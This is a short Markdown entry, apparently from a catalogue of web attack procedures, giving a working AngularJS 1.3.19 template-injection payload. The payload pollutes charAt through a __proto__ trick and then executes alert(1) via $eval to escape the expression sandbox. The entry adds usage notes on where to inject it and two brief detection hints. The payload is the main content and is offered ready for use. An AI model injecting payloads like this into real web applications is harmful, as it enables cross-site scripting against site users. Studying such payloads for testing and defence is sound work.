---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - proto-pollution
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Proto-CharAt-Pollution

## Code

```javascript
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}
```

## Description

Uses array-like __proto__ access to pollute charAt and execute alert via $eval in AngularJS 1.3.19.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Relies on toString/valueOf tricks. | N/A |

## Usage

In fields allowing complex object literals.

## Detection

- __proto__ access in input validation.
- valueOf/join anomalies.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
